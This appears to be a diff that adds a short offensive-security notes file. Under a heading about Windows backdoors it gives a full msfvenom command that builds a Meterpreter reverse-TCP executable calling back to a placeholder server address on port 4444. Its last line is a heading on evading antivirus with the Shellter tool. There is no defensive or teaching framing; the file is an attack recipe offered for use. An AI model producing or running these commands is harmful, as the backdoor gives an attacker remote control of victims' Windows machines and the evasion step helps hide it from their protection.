@@ -1,0 +1,4 @@
+#Generating windows simple binary backdoors
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=SERVER_IPADDRESS LPORT=4444 -f exe > bin.exe
+
+#Evating anti-virus w/ shelter (https://www.shellterproject.com/)
